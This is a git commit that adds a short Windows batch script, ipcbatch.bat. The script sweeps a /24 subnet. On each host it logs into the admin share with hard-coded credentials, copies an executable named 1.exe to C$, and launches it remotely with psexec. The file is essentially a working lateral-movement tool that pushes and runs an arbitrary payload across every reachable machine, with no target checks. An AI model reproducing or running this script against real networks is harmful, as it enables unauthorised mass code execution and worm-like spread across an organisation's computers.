a5a00d86bd833122c332c23159f7c3f0d65a3cb8
v1ct0rme <34261184+v1ct0rme@users.noreply.github.com>
2017-12-12 11:41:25 +0800

    Add files via upload

---
+++ ipcbatch.bat
@@ -0,0 +1,14 @@
+@echo off&sacn MAC,IP,computer name&color a&mode con: cols=60 lines=22
+setlocal enabledelayedexpansion
+set ipq=10.1.1
+set /a ip1=1
+set /a ip2=255
+set /a con=0
+set /a contotal=%ip2%-%ip1%+1
+for /l %%i in (!ip1!,1,!ip2!) do (
+set ip=!ipq!.%%i
+echo sacn!ip!
+net use \\!ip! password /user:domain\user
+copy 1.exe \\!ip!\C$\
+psexec \\!ip! c:\1.exe
+)
